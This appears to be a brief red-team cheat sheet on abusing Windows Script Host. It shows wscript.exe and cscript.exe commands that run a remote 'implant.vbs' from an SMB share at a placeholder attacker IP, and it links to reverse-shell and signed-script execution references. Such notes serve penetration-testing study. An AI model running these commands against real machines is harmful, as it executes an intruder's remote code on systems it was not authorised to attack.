# Windows Scripting Host

## VBScript

```
C:\> wscript.exe <script.js | script.vbs>

C:\> wscript.exe //E:vbscript \\<attacker_IP>\path\to\implant.vbs
```

## JScript Dialect

```
C:\> cscript.exe <script.js | script.vbs | script.cs>

C:\> cscript.exe //E:jscript \\<attacker_IP>\path\to\implant.vbs
```

---
## References

### Hacktricks

- [Hacktricks: Windows Reverse Shells](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/reverse-shells/windows.html)

### Red Team Notes

- [Red Team Notes: `pubprn.vbs` Signed Script Code Execution](https://www.ired.team/offensive-security/code-execution/t1216-signed-script-ce)